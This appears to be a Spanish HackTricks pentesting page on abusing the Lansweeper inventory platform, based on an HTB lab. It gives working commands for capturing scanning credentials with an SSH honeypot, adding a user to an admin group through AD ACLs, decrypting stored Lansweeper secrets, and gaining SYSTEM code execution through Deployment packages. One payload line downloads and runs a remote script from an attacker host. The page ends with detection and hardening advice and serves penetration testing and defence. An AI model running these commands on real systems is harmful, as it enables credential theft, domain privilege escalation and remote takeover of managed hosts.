# Abuso de Lansweeper: recolección de credenciales, descifrado de secretos y RCE mediante Deployment

{{#include ../../banners/hacktricks-training.md}}

Lansweeper es una plataforma de descubrimiento e inventario de activos de TI que suele implementarse en Windows e integrarse con Active Directory. Las credenciales configuradas en Lansweeper son utilizadas por sus motores de scanning para autenticarse en los activos mediante protocolos como SSH, SMB/WMI y WinRM. Las configuraciones incorrectas permiten con frecuencia:

- Interceptar credenciales redirigiendo un objetivo de scanning a un host controlado por el atacante (honeypot)
- Abusar de las ACL de AD expuestas por grupos relacionados con Lansweeper para obtener acceso remoto
- Descifrar en el host los secretos configurados en Lansweeper (connection strings y credenciales de scanning almacenadas)
- Ejecutar código en endpoints administrados mediante la función Deployment (que a menudo se ejecuta como SYSTEM)

Esta página resume workflows y comandos prácticos para que los atacantes abusen de estos comportamientos durante los engagements.

## 1) Recolectar credenciales de scanning mediante un honeypot (ejemplo con SSH)

Idea: crear un Scanning Target que apunte a tu host y asignarle las Scanning Credentials existentes. Cuando se ejecute el scan, Lansweeper intentará autenticarse con esas credenciales y tu honeypot las capturará.<sup>[[1]](#references)</sup>

Resumen de los pasos (interfaz web):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (o Single IP) = tu IP de la VPN
- Configurar el puerto SSH en uno accesible (por ejemplo, 2022 si el 22 está bloqueado)
- Deshabilitar la programación y planificar el trigger manual
- Scanning → Scanning Credentials → comprobar que existan credenciales de Linux/SSH; asignarlas al nuevo target (habilitar todas según sea necesario)
- Hacer clic en “Scan now” en el target
- Ejecutar un honeypot de SSH y recuperar el username/password intentado

Ejemplo con sshesame:<sup>[[2]](#references)</sup>
```yaml
# sshesame.yaml
server:
listen_address: 0.0.0.0:2022
```

```bash
# Prefer a current release/container; the package in Debian-derived repositories may be stale
sshesame -config sshesame.yaml

# Or run the maintained container image
docker run --rm -it -p 2022:2022 \
-v "$PWD/sshesame.yaml:/config.yaml:ro" ghcr.io/jaksi/sshesame
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Validar las credenciales capturadas contra los servicios del DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notas
- Otros protocolos no son equivalentes: un listener SMB/WinRM normalmente obtiene un desafío-respuesta NTLM en lugar de una contraseña en texto claro. Crackearlo o hacer relay depende de las protecciones del protocolo negociado; consulta [network poisoning and relay attacks](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md). La autenticación de contraseñas SSH suele ser el caso más sencillo de texto claro.
- La autenticación SSH mediante clave pública expone al servidor el nombre de usuario y la huella digital de la clave pública, **no** la clave privada ni su passphrase. Recupera las credenciales respaldadas por claves desde el servidor Lansweeper comprometido en lugar de esperar que un honeypot las revele.<sup>[[2]](#references)</sup>
- Muchos scanners se identifican mediante banners de cliente específicos (por ejemplo, RebexSSH) e intentan comandos benignos (uname, whoami, etc.).

### El orden de selección de credenciales es importante

Para un rescan, Lansweeper primero vuelve a intentar la credencial que tuvo éxito por última vez para ese asset, después las credenciales asignadas explícitamente en el orden configurado y, finalmente, la credencial global del mismo tipo. Por lo tanto, un honeypot que acepta la primera autenticación mediante contraseña normalmente no observará las credenciales de fallback posteriores; durante una evaluación autorizada de la ruta de credenciales, registra y rechaza los intentos si el objetivo es verificar la secuencia de fallback completa.<sup>[[6]](#references)</sup>

## 2) Abuso de ACL de AD: obtener acceso remoto agregándote a un grupo de administradores de una aplicación

Usa BloodHound para enumerar los permisos efectivos de la cuenta comprometida. Un hallazgo común es un grupo específico del scanner o de la aplicación (por ejemplo, “Lansweeper Discovery”) con GenericAll sobre un grupo privilegiado (por ejemplo, “Lansweeper Admins”). Si el grupo privilegiado también es miembro de “Remote Management Users”, WinRM estará disponible en cuanto nos agreguemos.<sup>[[1]](#references)[[5]](#references)</sup>

Ejemplos de Collection:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Explotar GenericAll en un grupo con BloodyAD (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Luego obtén un shell interactivo:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Consejo: las operaciones de Kerberos dependen del tiempo. Si aparece KRB_AP_ERR_SKEW, sincronízate primero con el DC:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Descifrar secretos configurados de Lansweeper en el host

En el servidor de Lansweeper, el sitio ASP.NET normalmente almacena una cadena de conexión cifrada y una clave simétrica utilizada por la aplicación. Con el acceso local adecuado, puedes descifrar la cadena de conexión de la DB y, después, extraer las credenciales de scanning almacenadas.<sup>[[1]](#references)</sup>

Ubicaciones habituales:
- Configuración web: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Clave de la aplicación: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Usa SharpLansweeperDecrypt para automatizar el descifrado y volcar las credenciales almacenadas. Sin argumentos, el ejecutable actual descifra `web.config`, se conecta a la base de datos y vuelca todas las credenciales de scanning configuradas; `-e` también permite realizar un descifrado offline/manual cuando ya están disponibles un valor cifrado y el archivo de clave:<sup>[[3]](#references)</sup>
```powershell
# Automatic: use the default web.config and Encryption.txt locations
.\SharpLansweeperDecrypt.exe

# Manual: decrypt one database value with an explicit key file
.\SharpLansweeperDecrypt.exe -e '<encrypted-base64-value>' `
-p 'C:\Program Files (x86)\Lansweeper\Key\Encryption.txt'

# The repository also provides LansweeperDecrypt.ps1 when loading .NET tooling is unsuitable
powershell -ExecutionPolicy Bypass -File .\LansweeperDecrypt.ps1
```
El resultado esperado incluye detalles de conexión a la DB y credenciales de scanning en texto plano, como cuentas de Windows y Linux utilizadas en todo el entorno. Estas suelen tener permisos locales elevados en los hosts del dominio:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Usa las credenciales de escaneo de Windows recuperadas para obtener acceso privilegiado:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Como miembro de “Lansweeper Admins”, la interfaz web expone Deployment y Configuration. En Deployment → Deployment packages, puedes crear paquetes que ejecuten comandos arbitrarios en los assets objetivo. Lansweeper utiliza una credencial administrativa de scanning para acceder al Task Scheduler y a `C$` del objetivo, y después crea una tarea para el deployment. Cuando el paquete utiliza el modo de ejecución **System Account**, el payload se ejecuta como `NT AUTHORITY\SYSTEM`; otros modos de ejecución pueden utilizar la credencial de scanning asignada o el usuario que ha iniciado sesión actualmente, así que verifica el modo seleccionado en lugar de asumir que es SYSTEM.<sup>[[1]](#references)[[7]](#references)</sup>

Pasos generales:
- Crea un nuevo paquete de Deployment que ejecute un one-liner de PowerShell o cmd (reverse shell, add-user, etc.).
- Selecciona el asset deseado como objetivo (por ejemplo, el DC/host donde se ejecuta Lansweeper) y haz clic en Deploy/Run now.
- Recibe tu shell como SYSTEM.

Payloads de ejemplo (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Las acciones de Deployment son ruidosas y dejan registros en Lansweeper y en los registros de eventos de Windows. Úsalas con prudencia.

### Artefactos de Deployment y un segundo punto de exposición de credenciales

El scanner escribe su ejecutable de Deployment en `C:\Windows\LSDeployment` a través de `C$`. Los archivos de paquetes normalmente se leen desde `DefaultPackageShare$`, respaldado por `C:\Program Files (x86)\Lansweeper\PackageShare`, o desde un package share específico para un rango de IP. Es importante destacar que Lansweeper documenta que la credencial del package share se almacena **en forma cifrada reversiblemente en el registro de cada equipo que recibe un Deployment**. Considera un endpoint administrado comprometido como un posible punto de divulgación de esa cuenta del share, e inspecciona el directorio de Deployment, el historial de tareas programadas y los package shares configurados al reconstruir la actividad de Lansweeper.<sup>[[7]](#references)</sup>

## Detección y hardening

- Restringe o elimina las enumeraciones SMB anónimas. Supervisa el RID cycling y el acceso anómalo a los shares de Lansweeper.
- Controles de salida: bloquea o restringe estrictamente el SSH/SMB/WinRM saliente desde los hosts del scanner. Genera alertas sobre puertos no estándar (por ejemplo, 2022) y client banners inusuales como Rebex.
- Protege `Website\\web.config` y `Key\\Encryption.txt`. Externaliza los secretos a un vault y rótalos cuando se expongan. Considera service accounts con privilegios mínimos y gMSA cuando sea viable.
- Monitorización de AD: genera alertas sobre cambios en grupos relacionados con Lansweeper (por ejemplo, “Lansweeper Admins” y “Remote Management Users”) y sobre cambios de ACL que otorguen membresía GenericAll/Write en grupos privilegiados.
- Audita la creación, los cambios y la ejecución de paquetes de Deployment, y correlaciona las nuevas tareas remotas programadas con escrituras en `C:\Windows\LSDeployment`; genera alertas sobre paquetes que inicien `cmd.exe`/`powershell.exe` o conexiones salientes inesperadas.
- Otorga a las credenciales del package share únicamente el permiso **Read & Execute** y nunca las reutilices para la administración. Prefiere el inventario basado en agentes cuando sea práctico: si todos los equipos se escanean mediante un agente y el módulo de Deployment no se utiliza, Lansweeper no requiere credenciales de escaneo de equipos almacenadas.<sup>[[6]](#references)[[7]](#references)</sup>

## Temas relacionados
- [Enumeración de SMB/LSA/SAMR y RID cycling](../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md)
- [Autenticación Kerberos y consideraciones sobre el desfase horario](kerberos-authentication.md)
- [Análisis de rutas de BloodHound](bloodhound.md)
- [Uso de WinRM y movimiento lateral](../lateral-movement/winrm.md)



## References
- [1] [HTB: Sweep — Abuso del escaneo de Lansweeper, las ACL de AD y los secretos para tomar el control de un DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (honeypot de SSH)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)
- [6] [Crear y asignar credenciales de escaneo — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/create-and-map-scanning-credentials)
- [7] [Requisitos de Deployment — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/deployment-requirements)
{{#include ../../banners/hacktricks-training.md}}
